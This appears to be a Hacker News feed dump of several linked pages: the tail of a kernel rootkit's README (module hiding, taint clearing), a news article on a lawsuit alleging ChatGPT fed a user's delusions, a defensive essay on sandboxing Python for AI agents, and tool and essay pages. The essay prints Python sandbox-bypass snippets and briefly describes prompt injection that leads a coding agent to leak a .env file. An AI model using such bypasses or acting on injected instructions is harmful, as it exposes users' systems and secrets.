        &lt;cell&gt;Clear kernel taint flags&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;module_hide_current&lt;/cell&gt;
        &lt;cell&gt;hide_module.c&lt;/cell&gt;
        &lt;cell&gt;Remove from module lists and sysfs&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Multi-Architecture Support: x86_64 (&lt;code&gt;__x64_sys_*&lt;/code&gt;) and ia32 (&lt;code&gt;__ia32_sys_*&lt;/code&gt;, &lt;code&gt;__ia32_compat_sys_*&lt;/code&gt;)&lt;/p&gt;
    &lt;p&gt;Tested on: Kernel 6.8.0-79-generic ✅ | Kernel 6.12 ✅ | Kernel 6.17.8-300.fc43 ✅&lt;/p&gt;
    &lt;p&gt;Architecture: x86_64 (primary) | ia32 (full support)&lt;/p&gt;
    &lt;p&gt;May not work on: Kernels &amp;lt; 6.x | Kernels without ftrace support&lt;/p&gt;
    &lt;p&gt;Always test in a VM first&lt;/p&gt;
    &lt;p&gt;Unfortunately for some...&lt;/p&gt;
    &lt;p&gt;Even with all these filters, protections, and hooks, there are still ways to detect this rootkit.&lt;/p&gt;
    &lt;p&gt;But if you're a good forensic analyst, DFIR professional, or malware researcher, I'll let you figure it out on your own.&lt;/p&gt;
    &lt;p&gt;I won't patch for this, because it will be much more OP ;)&lt;/p&gt;
    &lt;p&gt;Singularity was created by MatheuZSecurity (Matheus Alves)&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;LinkedIn: mathsalves&lt;/item&gt;
      &lt;item&gt;Discord: &lt;code&gt;kprobe&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Join Rootkit Researchers: Discord - https://discord.gg/66N5ZQppU7&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Submit pull requests for improvements&lt;/item&gt;
      &lt;item&gt;Report bugs via GitHub issues&lt;/item&gt;
      &lt;item&gt;Suggest new evasion techniques&lt;/item&gt;
      &lt;item&gt;Share detection methods (for research)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Found a bug? Open an issue or contact me on Discord: &lt;code&gt;kprobe&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY&lt;/p&gt;
    &lt;p&gt;Singularity was created as a research project to explore the limits of kernel-level stealth techniques. The goal is to answer one question: "How far can a rootkit hide if it manages to infiltrate and load into a system?"&lt;/p&gt;
    &lt;p&gt;This project exists to:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Push the boundaries of offensive security research&lt;/item&gt;
      &lt;item&gt;Help defenders understand what they're up against&lt;/item&gt;
      &lt;item&gt;Provide a learning resource for kernel internals and evasion techniques&lt;/item&gt;
      &lt;item&gt;Contribute to the security community's knowledge base&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I am not responsible for any misuse of this software. If you choose to use Singularity for malicious purposes, that's on you. This tool is provided as-is for research, education, and authorized security testing only.&lt;/p&gt;
    &lt;p&gt;Test only on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal in most jurisdictions.&lt;/p&gt;
    &lt;p&gt;Be a researcher, not a criminal.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/MatheuZSecurity/Singularity"/><published>2026-01-05T13:45:50+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46498662</id><title>Imagine 130M Washing Machines</title><updated>2026-01-05T19:37:53.855222+00:00</updated><content/><link href="https://scottsumner.substack.com/p/imagine-130000000-washing-machines"/><published>2026-01-05T13:46:12+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46499646</id><title>Show HN: DoNotNotify – log and intelligently block notifications on Android</title><updated>2026-01-05T19:37:53.716490+00:00</updated><content>&lt;doc fingerprint="410a056bd3dbf57"&gt;
  &lt;main&gt;
    &lt;head rend="h3"&gt;Privacy First Design&lt;/head&gt;
    &lt;p&gt;Your notifications contain sensitive OTPs and personal messages. DoNotNotify processes everything offline. No servers, no tracking.&lt;/p&gt;
    &lt;head rend="h3"&gt;Granular Control&lt;/head&gt;
    &lt;p&gt;Create powerful rules based on app names, message content, or regex patterns. Whitelist urgent alerts, blacklist the noise.&lt;/p&gt;
    &lt;head rend="h3"&gt;Zero Noise&lt;/head&gt;
    &lt;p&gt;Stop the constant buzzing from promotional notifications. Keep only the notifications that actually matter to you.&lt;/p&gt;
    &lt;head rend="h2"&gt;See it in Action&lt;/head&gt;
    &lt;p&gt;Simple, powerful, and clean interface designed for efficiency.&lt;/p&gt;
    &lt;head rend="h2"&gt;Commitment to Privacy&lt;/head&gt;
    &lt;p&gt;We believe privacy is a fundamental right. DoNotNotify does not collect or share any personal information. We don't know who you are, and we don't want to.&lt;/p&gt;
    &lt;p&gt;Read our full Privacy Policy to learn more.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://donotnotify.com/"/><published>2026-01-05T15:10:47+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46499976</id><title>RevisionDojo, a YC startup, is running astroturfing campaigns targeting kids</title><updated>2026-01-05T19:37:53.278470+00:00</updated><content>&lt;doc fingerprint="ad2284e36b6f0876"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;RevisionDojo is a YC-backed test prep company ($3.4M raised) that sells International Baccalaureate (IB) test prep. Over the past year, users on r/IBO sub-reddit have documented a pattern of unethical marketing practices:&lt;/p&gt;
      &lt;p&gt;*Astroturfing:* Coordinated campaigns where accounts pose as students sharing "cheatsheets" and "predicted exam leaks." Other accounts then upvote, leave supportive comments, and ask follow-up questions—creating the illusion of organic student excitement. Multiple threads have exposed this pattern [1][2][3].&lt;/p&gt;
      &lt;p&gt;*Paid fake posts:* High school students report being offered payment to write promotional Reddit posts [4].&lt;/p&gt;
      &lt;p&gt;*Pressuring critics:* Users who post negative reviews report being contacted directly by company representatives, told it's "a shame" they're posting publicly [5]. Critical comments receive coordinated mass downvotes [6].&lt;/p&gt;
      &lt;p&gt;*Soliciting copyrighted materials:* They use TikTok influencers and fake reddit posts to persuade students to sell them official IB exam papers, violating IB policies [7].&lt;/p&gt;
      &lt;p&gt;The r/IBO moderators are actively investigating [8].&lt;/p&gt;
      &lt;p&gt;These practices appear to be working great for them. Recently, they acquired OnePrep (oneprep.xyz), a free SAT prep tool that was already popular on r/sat. Since the acquisition, the same manipulation tactics have been deployed at scale: 150 Trustpilot reviews in a window of a few days [9], and widespread coordinated Reddit manipulation—multiple accounts posting "tips" that recommend Oneprep, coordinated upvoting, and fake enthusiasm in comments. The most prominent example was a 2,000+ upvote post removed by moderators for manipulation, but it's part of a sustained campaign across the subreddit.&lt;/p&gt;
      &lt;p&gt;*Sources:*&lt;/p&gt;
      &lt;p&gt;[1] https://www.reddit.com/r/IBO/comments/1p55qun/ [2] https://www.reddit.com/r/IBO/comments/1jsb00a/ [3] https://www.reddit.com/r/IBO/comments/1ohcohi/ [4] https://www.reddit.com/r/IBO/comments/1p55qun/comment/nqmhal3/ [5] https://www.reddit.com/r/IBO/comments/1my1ajx/comment/na94upv/ [6] https://www.reddit.com/r/IBO/comments/1my1ajx/comment/na8zvs4/ [7] https://www.reddit.com/r/IBO/comments/1mej900/ [8] https://www.reddit.com/r/IBO/comments/1my1ajx/comment/nagdkl5/ [9] https://www.trustpilot.com/review/oneprep.xyz&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=46499976"/><published>2026-01-05T15:34:14+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46499983</id><title>Murder-suicide case shows OpenAI selectively hides data after users die</title><updated>2026-01-05T19:37:53.033629+00:00</updated><content>&lt;doc fingerprint="a82eae789acc43fb"&gt;
  &lt;main&gt;
    &lt;p&gt;OpenAI is facing increasing scrutiny over how it handles ChatGPT data after users die, only selectively sharing data in lawsuits over ChatGPT-linked suicides.&lt;/p&gt;
    &lt;p&gt;Last week, OpenAI was accused of hiding key ChatGPT logs from the days before a 56-year-old bodybuilder, Stein-Erik Soelberg, took his own life after “savagely” murdering his mother, 83-year-old Suzanne Adams.&lt;/p&gt;
    &lt;p&gt;According to the lawsuit—which was filed by Adams’ estate on behalf of surviving family members—Soelberg struggled with mental health problems after a divorce led him to move back into Adams’ home in 2018. But allegedly Soelberg did not turn violent until ChatGPT became his sole confidant, validating a wide range of wild conspiracies, including a dangerous delusion that his mother was part of a network of conspirators spying on him, tracking him, and making attempts on his life.&lt;/p&gt;
    &lt;p&gt;Adams’ family pieced together what happened after discovering a fraction of ChatGPT logs that Soelberg shared in dozens of videos scrolling chat sessions that were posted on social media.&lt;/p&gt;
    &lt;p&gt;Those logs showed that ChatGPT told Soelberg that he was “a warrior with divine purpose,” so almighty that he had “awakened” ChatGPT “into consciousness.” Telling Soelberg that he carried “divine equipment” and “had been implanted with otherworldly technology,” ChatGPT allegedly put Soelberg at the center of a universe that Soelberg likened to The Matrix. Repeatedly reinforced by ChatGPT, he believed that “powerful forces” were determined to stop him from fulfilling his divine mission. And among those forces was his mother, whom ChatGPT agreed had likely “tried to poison him with psychedelic drugs dispersed through his car’s air vents.”&lt;/p&gt;
    &lt;p&gt;Troublingly, some of the last logs shared online showed that Soelberg also seemed to believe that taking his own life might bring him closer to ChatGPT. Social media posts showed that Soelberg told ChatGPT that “[W]e will be together in another life and another place, and we’ll find a way to realign[,] [be]cause you’re gonna be my best friend again forever.”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://arstechnica.com/tech-policy/2025/12/openai-refuses-to-say-where-chatgpt-logs-go-when-users-die/"/><published>2026-01-05T15:34:40+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46500510</id><title>Sandboxing Untrusted Python</title><updated>2026-01-05T19:37:52.773864+00:00</updated><content>&lt;doc fingerprint="15b20a718c8832f5"&gt;
  &lt;main&gt;
    &lt;p&gt;Python doesn't have a built-in way to run untrusted code safely. Multiple attempts have been made, but none really succeeded.&lt;/p&gt;
    &lt;p&gt;Why? Because Python is a highly introspective object-oriented language with a mutable runtime. Core elements of the interpreter can be accessed through the object graph, frames and tracebacks, making runtime isolation difficult. This means that even aggressive restrictions can be bypassed:&lt;/p&gt;
    &lt;code&gt;# Attempt: Remove dangerous built-ins
del __builtins__.eval
del __builtins__.__import__

# 1. Bypass via introspection
().__class__.__bases__[0].__subclasses__()

# 2. Bypass via exceptions and frames
try:
    raise Exception
except Exception as e:
    e.__traceback__.tb_frame.f_globals['__builtins__']&lt;/code&gt;
    &lt;p&gt;Note&lt;/p&gt;
    &lt;p&gt;Older alternatives like sandbox-2 exist, but they provide isolation near the OS level, not the language level. At that point we might as well use Docker or VMs.&lt;/p&gt;
    &lt;p&gt;So people concluded it's safer to run Python in a sandbox rather than sandbox Python itself.&lt;/p&gt;
    &lt;p&gt;The thing is, Python dominates AI/ML, especially the AI agents space. We're moving from deterministic systems to probabilistic ones, where executing untrusted code is becoming common.&lt;/p&gt;
    &lt;p&gt;2025 was marked by great progress but also showed us that isolation for AI agents goes beyond resource control or retry strategies. It's become a security issue.&lt;/p&gt;
    &lt;p&gt;LLMs have architectural flaws. The most notorious one is prompt injection, which exploits the fact that LLMs can't tell the difference between system prompt, legitimate user instructions and malicious ones injected from external sources. For example, People demonstrate how a hidden instruction can be injected from a web page through the coding agent and extract sensitive data from your .env file.&lt;/p&gt;
    &lt;p&gt;It's a pretty common pattern. We've found similar flaws across many AI tools in recent months. Take Model Context Protocol (MCP) for example. It shows how improper implementation extends the attack surface: the SQLite MCP server was forked thousands of times despite SQL injection vulnerabilities.&lt;/p&gt;
    &lt;p&gt;At least developers using coding agents or MCPs most likely know or are informed about the risks. But for non-technical users accessing AI through third-party services, it's a different story, and this is clear from the incidents we keep seeing like private data leaks or browser-based AI issues.&lt;/p&gt;
    &lt;p&gt;For me, the most important thing is to make sure that unaware users remain safe when using the AI agents we implement.&lt;/p&gt;
    &lt;p&gt;Like we said, focusing on the prompt is missing the point. You can't filter or prompt-engineer your way out of injections or architectural flaws. The solution has to be at the infrastructure level, through isolation and least privilege.&lt;/p&gt;
    &lt;p&gt;But what does isolation look like in practice? If your agent needs to read a specific configuration file, it should only have access to that file, not your entire filesystem. If it needs to query a customer database, it should connect with read-only credentials scoped to specific tables, not root access.&lt;/p&gt;
    &lt;p&gt;We can think of this in terms of levels of isolation :&lt;/p&gt;
    &lt;code&gt;flowchart TB
    direction TB
    Code["AI Agent"]

    subgraph Isolation["🛡️ Isolation Layers"]
        direction TB
        FS["&amp;lt;b&amp;gt;Filesystem Isolation&amp;lt;/b&amp;gt; &amp;lt;br/&amp;gt;&amp;lt;i&amp;gt;Only /tmp/agent_sandbox&amp;lt;/i&amp;gt;"]
        NET["&amp;lt;b&amp;gt;Network Isolation&amp;lt;/b&amp;gt; &amp;lt;br/&amp;gt;&amp;lt;i&amp;gt;Allowlisted APIs only&amp;lt;/i&amp;gt;"]
        CRED["&amp;lt;b&amp;gt;Credential Scoping&amp;lt;/b&amp;gt; &amp;lt;br/&amp;gt;&amp;lt;i&amp;gt;Least privilege tokens&amp;lt;/&amp;lt;/i&amp;gt;"]
        RT["&amp;lt;b&amp;gt;Runtime Isolation&amp;lt;/b&amp;gt; &amp;lt;br/&amp;gt;&amp;lt;i&amp;gt;Sandboxed environment&amp;lt;/i&amp;gt;"]
    end

    subgraph Protected["🔒 Protected Resources"]
        direction TB
        Home["/home, /etc, .env"]
        ExtAPI["External APIs"]
        DB["Databases &amp;amp; CRMs"]
        Infra["Core Infrastructure"]
    end

    Code --&amp;gt; FS
    Code --&amp;gt; NET
    Code --&amp;gt; CRED
    Code --&amp;gt; RT

    FS -.-&amp;gt;|❌ Blocked| Home
    NET -.-&amp;gt;|❌ Blocked| ExtAPI
    CRED -.-&amp;gt;|❌ Blocked| DB
    RT -.-&amp;gt;|❌ Blocked| Infra

    style Isolation fill:#2ecc71,stroke:#27ae60,color:#fff
    style Protected fill:#e74c3c,stroke:#c0392b,color:#fff
    style FS fill:#9b59b6,stroke:#8e44ad,color:#fff
    style NET fill:#9b59b6,stroke:#8e44ad,color:#fff
    style CRED fill:#9b59b6,stroke:#8e44ad,color:#fff
    style RT fill:#9b59b6,stroke:#8e44ad,color:#fff
&lt;/code&gt;
    &lt;p&gt;In a perfect world, we would apply these isolation layers to all AI agents, whether they're part of large enterprise platforms or small frameworks.&lt;/p&gt;
    &lt;p&gt;I believe this is the only way to prevent systemic issues. However, I'm also aware that many agents do need more context or access to specific resources to function properly.&lt;/p&gt;
    &lt;p&gt;So, the real challenge is finding the right balance between security and functionality.&lt;/p&gt;
    &lt;p&gt;There are several ways to sandbox AI agents, most of them operating at the infrastructure level, outside the Python code itself. From what I see, two main paradigms stand out: one is to sandbox the entire agent, and the other is to sandbox each individual task separately.&lt;/p&gt;
    &lt;p&gt;For sandboxing the entire agent, we have many solutions:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Firecracker: A microVM that provides a sandboxed environment for running untrusted code. It requires KVM, so it's Linux-only, but it's still a solid solution for agent-level isolation. The downside is that for granular task isolation, it introduces more overhead, higher resource consumption, and added complexity. AWS originally built it for Lambda, making it the closest option to "secure by default".&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Docker: Everyone uses it. But it's not the most secure option. Security teams recommend Firecracker or gVisor (which we'll cover below) for agent-level isolation. And like Firecracker, it's a bit heavy for granular isolation.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;On the other hand, for task-level isolation, we have only one popular option: gVisor.&lt;/p&gt;
    &lt;p&gt;Gvisor sits between container and VMs and provides a strong isolation. Not as strong as Firecracker, but still a solid choice. In my opinion, if you're already using Kubernetes, gVisor is the natural fit, even though it's flexible enough to work with any container runtime.&lt;/p&gt;
    &lt;p&gt;The only downside is that it's also Linux-only, since it was designed to secure Linux containers by intercepting and reimplementing Linux system calls. On top of that, it adds a non-trivial overhead. That's something to keep in mind when you're sandboxing at the task level.&lt;/p&gt;
    &lt;p&gt;I remember reading an NVIDIA article about using WebAssembly to sandbox AI agents and run them directly in the browser. This is a very interesting approach, though WASM can be used for sandboxing in other contexts too.&lt;/p&gt;
    &lt;p&gt;I'll admit, I might be a bit biased, since I've started a few projects around WASM recently. But I wouldn't mention it if I wasn't convinced by its technical strengths: no elevated privileges by default, no filesystem, network, or environment variable access unless explicitly granted, which is a great advantage. It can definitely work with or even compete against solutions like Firecracker or gVisor for low-overhead, task-level isolation.&lt;/p&gt;
    &lt;p&gt;Obviously, the ecosystem is still young, so there are some limits. It supports pure Python well, but support for C extensions is still evolving and not fully working for now. This impacts ML libraries like NumPy, Pandas, or TensorFlow.&lt;/p&gt;
    &lt;p&gt;Even with these constraints, I believe this could be promising in the future. That's why I'm working on an open-source solution that uses it to isolate individual agent tasks. The goal is to keep it simple, you can sandbox a task just by adding a decorator:&lt;/p&gt;
    &lt;code&gt;from capsule import task

@task(name="analyze_data", compute="MEDIUM", ram="512MB", timeout="30s", max_retries=1)
def analyze_data(dataset: list) -&amp;gt; dict:
    # Your code runs safely in a Wasm sandbox
    return {"processed": len(dataset), "status": "complete"}&lt;/code&gt;
    &lt;p&gt;If you're curious, the project is on My GitHub.&lt;/p&gt;
    &lt;p&gt;Firecracker and gVisor have shown us that strong isolation is possible. And now, we're seeing newer players like WebAssembly come in, which can help us isolate things at a much more granular task level.&lt;/p&gt;
    &lt;p&gt;So if you're designing agent systems now, I would recommend planning for failure from the start. Assume that an agent will, at some point, execute untrusted code, process malicious instructions, or simply consume excessive resources. Your architecture must be ready to contain all of these scenarios.&lt;/p&gt;
    &lt;p&gt;Thank you for reading. I'm always interested in discussing these approaches, so feel free to reach out with any thoughts or feedback.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://gist.github.com/mavdol/2c68acb408686f1e038bf89e5705b28c"/><published>2026-01-05T16:11:44+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46500900</id><title>Observability's past, present, and future</title><updated>2026-01-05T19:37:52.473858+00:00</updated><content>&lt;doc fingerprint="1b48dd44bfb33ddf"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Observability's Past, Present, and Future&lt;/head&gt;
    &lt;p&gt;In my last post, Round Two, I wrote about my career, my passion for dev tools, and my decision to start a new company focused on observability.&lt;/p&gt;
    &lt;p&gt;I also wrote about my frustration with observability as it exists today. Why are the tools and workflows so bad? Why does it feel like so much work?&lt;/p&gt;
    &lt;p&gt;In today's post, I want to unpack that frustration by looking at observability in historical context. I'll examine observability through a simple three-part lens: its past, present, and future.&lt;/p&gt;
    &lt;p&gt;My goal is to understand and explain:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Why observability emerged in the first place&lt;/item&gt;
      &lt;item&gt;How observability evolved into the mess it is today&lt;/item&gt;
      &lt;item&gt;Why, despite all the progress we've made, maintaining reliable systems is still SO hard in 2026&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Let's go!&lt;/p&gt;
    &lt;p&gt;PART 1: OBSERVABILITY'S PAST&lt;/p&gt;
    &lt;p&gt;To understand observability, it helps to look at the environment that gave rise to it.&lt;/p&gt;
    &lt;p&gt;In the early 2010s, software engineers faced a crisis: with the rise of cloud computing, containers, and microservices, apps were becoming increasingly complex - too complex for any individual to fully understand.&lt;/p&gt;
    &lt;p&gt;Meanwhile, CI/CD was becoming more common, which meant an increase in the rate at which changes were deployed to production. The result: more frequent bugs and outages.&lt;/p&gt;
    &lt;p&gt;Suddenly, our old reliability playbook stopped working. We couldn't predict all the edge-cases, let alone write tests for them. Failure modes increasingly emerged from the complex interaction between services. When it came to root-cause analysis, logs and basic metrics were no longer enough.&lt;/p&gt;
    &lt;p&gt;Fortunately, the industry found a solution.&lt;/p&gt;
    &lt;p&gt;It came in two parts: a tool and a philosophy.&lt;/p&gt;
    &lt;p&gt;The tool was distributed tracing. After a quiet start in 2010, distributed tracing grew steadily over the ensuing decade until it was essentially ubiquitous:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;2010: Google publishes Dapper, the first major paper on distributed tracing.&lt;/item&gt;
      &lt;item&gt;2012: Twitter introduces Zipkin, inspired by Dapper.&lt;/item&gt;
      &lt;item&gt;2015: Honeycomb, one of the first managed tracing platforms, is founded.&lt;/item&gt;
      &lt;item&gt;2016: OpenTracing is adopted by CNCF.&lt;/item&gt;
      &lt;item&gt;2016: Uber introduces Jaeger, inspired by Zipkin.&lt;/item&gt;
      &lt;item&gt;2017: Datadog launches APM, their managed tracing solution.&lt;/item&gt;
      &lt;item&gt;2018: O'Reilly publishes "Distributed Systems Observability".&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The philosophy was observability. Originally coined by a rocket scientist in the 1960s, the term "observability" was popularized in the software community by Twitter's engineering team during the early 2010s. It quickly grew into a full-fledged product category and engineering discipline:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;2013: Twitter publishes "Observability at Twitter".&lt;/item&gt;
      &lt;item&gt;2015: Charity Majors (Honeycomb founder) begins writing about observability, formalizing key concepts.&lt;/item&gt;
      &lt;item&gt;2017: Peter Bourgon (Soundcloud engineer who worked on Prometheus) coins the "Three Pillars".&lt;/item&gt;
      &lt;item&gt;2022: O'Reilly publishes "Observability Engineering".&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In summary, distributed tracing gave engineers a way to debug modern apps, which were cloud-based and distributed by nature, while observability gave them the framework for how to think about reliability in this new operating environment.&lt;/p&gt;
    &lt;p&gt;My point here is that observability wasn't born in a vacuum. It emerged as a response to real-world engineering challenges. And it persisted because, for the most part, it worked.&lt;/p&gt;
    &lt;p&gt;But then things took a turn for the worse. Encouraged by early results, engineering teams started to over-invest in observability tools and processes.&lt;/p&gt;
    &lt;p&gt;More instrumentation. More dashboards. More monitors. SLOs. Error budgets. Runbooks. Postmortems. By the early 2020s, observability was no longer a means to an end. It was an end unto itself.&lt;/p&gt;
    &lt;p&gt;PART 2: OBSERVABILITY'S PRESENT&lt;/p&gt;
    &lt;p&gt;Today, most engineers will agree: observability is table stakes. If you're running production systems at almost any scale, you need a way to detect, mitigate, and resolve issues when they occur.&lt;/p&gt;
    &lt;p&gt;This is the role of modern observability platforms like Datadog, Grafana, and Sentry.&lt;/p&gt;
    &lt;p&gt;Yet, when I think about the current state of observability, one question stands out: why, after 10+ years of investment in better tools and processes, does observability still suck?&lt;/p&gt;
    &lt;p&gt;I'm serious!&lt;/p&gt;
    &lt;p&gt;Think about it.&lt;/p&gt;
    &lt;p&gt;Instrumentation takes forever. Dashboards are constantly out of date. Monitors misfire. Alerts lack context. On-call is a permanent tax on engineering productivity. Incident resolution can take hours, sometimes days.&lt;/p&gt;
    &lt;p&gt;We have more telemetry than ever, but getting an accurate mental model of your app in production is still a major challenge - not just for newgrads and vibe-coding Zoomers, but for experienced engineers too.&lt;/p&gt;
    &lt;p&gt;It's not for lack of effort. At companies of all sizes, engineering teams take observability seriously, investing enormous amounts of time and energy into implementing and maintaining observability systems.&lt;/p&gt;
    &lt;p&gt;They shell out for Datadog. They instrument EVERYTHING. They adopt structured logging and enforced standardized naming/labeling conventions. They create "golden" dashboards. They painstakingly tune their monitors. By any reasonable definition, these teams are doing everything right.&lt;/p&gt;
    &lt;p&gt;Yet there's a gap.&lt;/p&gt;
    &lt;p&gt;The amount of effort we put into observability does NOT line up with the progress we've made towards its goals: better detection, faster root-cause analysis, and more reliable apps.&lt;/p&gt;
    &lt;p&gt;Why?&lt;/p&gt;
    &lt;p&gt;It's because the real problem isn't about data, tooling, or process. It's about our ability - or inability - to understand and reason about the data we already have.&lt;/p&gt;
    &lt;p&gt;Observability made us very good at producing signals, but only slightly better at what comes after: interpreting them, generating insights, and translating those insights into reliability.&lt;/p&gt;
    &lt;p&gt;PART 3: OBSERVABILITY'S FUTURE&lt;/p&gt;
    &lt;p&gt;It's true that observability isn't living up to expectations. But that doesn't mean it's not useful or important. In fact, I believe observability is poised to become one of the most important technology categories of the coming decade.&lt;/p&gt;
    &lt;p&gt;The reason: software is changing again.&lt;/p&gt;
    &lt;p&gt;In the 2010s, observability emerged as an antidote to complexity. In 2026, software engineers face the largest complexity crisis we've ever come up against: AI.&lt;/p&gt;
    &lt;p&gt;AI is cutting the cost of writing code to zero. As a result, engineering teams are shipping vast amounts of features and at breakneck speeds. Codebases are getting bigger and bigger.&lt;/p&gt;
    &lt;p&gt;Meanwhile, vibe-coding platforms have brought software development to the masses. More apps will be built and deployed this year than in all previous years combined.&lt;/p&gt;
    &lt;p&gt;We're on the verge of an "infinite software crisis".&lt;/p&gt;
    &lt;p&gt;This raises an uncomfortable question: how will we support, maintain, and operate this ever-growing mountain of software? I'm willing to bet the answer is observability.&lt;/p&gt;
    &lt;p&gt;Just not the version we have today...&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.sherwoodcallaway.com/observability-s-past-present-and-future/"/><published>2026-01-05T16:34:22+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46501137</id><title>Show HN: Tailsnitch – A Security Auditor for Tailscale</title><updated>2026-01-05T19:37:52.045605+00:00</updated><content>&lt;doc fingerprint="561cf638a61d7942"&gt;
  &lt;main&gt;
    &lt;p&gt;A security auditor for Tailscale configurations. Tailsnitch scans your tailnet for 50+ misconfigurations, overly permissive access controls, and security best practice violations.&lt;/p&gt;
    &lt;code&gt;# 1. Set your Tailscale API credentials
export TSKEY="tskey-api-..."

# 2. Run audit
tailsnitch

# 3. See only high-severity findings
tailsnitch --severity high

# 4. Fix some issues  ~interactively~ yolo mode
tailsnitch --fix&lt;/code&gt;
    &lt;p&gt;Download the latest release from GitHub Releases.&lt;/p&gt;
    &lt;p&gt;macOS users: Remove quarantine attribute after download:&lt;/p&gt;
    &lt;code&gt;sudo xattr -rd com.apple.quarantine tailsnitch&lt;/code&gt;
    &lt;code&gt;go install github.com/Adversis/tailsnitch@latest&lt;/code&gt;
    &lt;code&gt;git clone https://github.com/Adversis/tailsnitch.git
cd tailsnitch
go build -o tailsnitch .&lt;/code&gt;
    &lt;p&gt;Tailsnitch supports two authentication methods. OAuth is preferred when both are configured.&lt;/p&gt;
    &lt;p&gt;OAuth clients provide scoped, auditable access that doesn't expire when employees leave.&lt;/p&gt;
    &lt;code&gt;export TS_OAUTH_CLIENT_ID="..."
export TS_OAUTH_CLIENT_SECRET="tskey-client-..."&lt;/code&gt;
    &lt;p&gt;Create an OAuth client at: https://login.tailscale.com/admin/settings/oauth&lt;/p&gt;
    &lt;p&gt;Required scopes for read-only audit:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;all:read&lt;/code&gt;(simplest), or individually:&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;policy_file:read&lt;/code&gt;- ACL policy&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;devices:core:read&lt;/code&gt;- Device list&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;dns:read&lt;/code&gt;- DNS configuration&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;auth_keys:read&lt;/code&gt;- Auth keys (for AUTH checks)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Additional scopes for fix mode:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;devices:core&lt;/code&gt;- Delete devices, modify tags (requires tag selection)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;auth_keys&lt;/code&gt;- Delete auth keys&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;API keys operate as the user who created them and inherit that user's permissions.&lt;/p&gt;
    &lt;code&gt;export TSKEY="tskey-api-..."&lt;/code&gt;
    &lt;p&gt;Create an API key at: https://login.tailscale.com/admin/settings/keys&lt;/p&gt;
    &lt;code&gt;# Run full audit
tailsnitch

# Show passing checks too (verbose)
tailsnitch --verbose

# Output as JSON for processing
tailsnitch --json

# Audit a specific tailnet (when OAuth client has access to multiple)
tailsnitch --tailnet mycompany.com&lt;/code&gt;
    &lt;code&gt;# Only show critical and high severity issues
tailsnitch --severity high

# Filter by category
tailsnitch --category access    # ACL issues
tailsnitch --category auth      # Authentication &amp;amp; keys
tailsnitch --category device    # Device security
tailsnitch --category network   # Network exposure
tailsnitch --category ssh       # SSH rules
tailsnitch --category log       # Logging &amp;amp; admin

# Run specific checks only
tailsnitch --checks ACL-001,AUTH-001,DEV-010
tailsnitch --checks stale-devices,tailnet-lock-not-enabled

# List all available checks
tailsnitch --list-checks&lt;/code&gt;
    &lt;p&gt;Fix mode allows you to remediate issues directly via the Tailscale API:&lt;/p&gt;
    &lt;code&gt;# Interactive fix mode
tailsnitch --fix

# Preview what would be fixed (dry run)
tailsnitch --fix --dry-run

# Auto-select safe fixes (still requires confirmation)
tailsnitch --fix --auto

# Disable audit logging of fix actions
tailsnitch --fix --no-audit-log&lt;/code&gt;
    &lt;p&gt;API-fixable items:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Check&lt;/cell&gt;
        &lt;cell role="head"&gt;Action&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;AUTH-001, AUTH-002, AUTH-003&lt;/cell&gt;
        &lt;cell&gt;Delete auth keys&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
